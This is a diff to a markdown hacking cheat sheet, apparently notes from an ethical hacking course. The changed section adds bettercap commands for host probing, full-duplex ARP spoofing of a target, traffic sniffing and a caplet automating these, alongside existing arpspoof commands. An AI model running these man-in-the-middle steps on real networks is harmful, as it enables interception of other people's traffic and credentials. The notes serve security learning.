@@ -237,8 +237,8 @@ nmap -sV -T4 -O -F --version-light 192.168.0.1/24
 ```
 Try more profiles in zenmap.
 ### Man in the Middle (MITM)
-#### ARP spoofing
-##### Using arpspoof
+#### Using arpspoof
+##### ARP spoofing (arpspoof)
 To fool the victim.
 ```
 arpspoof -i wlan0 -t [targetIP] [routerIP]
@@ -253,6 +253,46 @@ Enable port forwarding.
 ```
 echo 1 > /proc/sys/net/ipv4/ip_forward
 ```
+#### Using bettercap
+##### Start
+```
+bettercap -iface wlan0
+```
+What to do: type `help` or `help module_name`
+
+##### Probing
+Keep probing for new hosts.
+```
+net.probe on
+net.recon on
+```
+To see hosts list.
+```
+net.show
+```
+##### ARP spoofing (bettercap)
+```
+set arp.spoof.fullduplex true
+set arp.spoof.targets [targetIP]
+arp.spoof on
+```
+##### Data sniffing
+```
+net.sniff on
+```
+##### Using caplet
+All commands can be run in a caplet file. e.g. for sniffing.
+```
+net.probe on
+net.recon on
+set arp.spoof.fullduplex true
+set arp.spoof.targets [targetIP]
+arp.spoof on
+net.sniff on
+```
+and save as filename.cap
+
+Run `bettercap -iface wlan0 -caplet filename.cap`
 
 Source: [Udemy: Learn ethical hacking from scratch by Zaid](https://www.udemy.com/course/learn-ethical-hacking-from-scratch/)
 
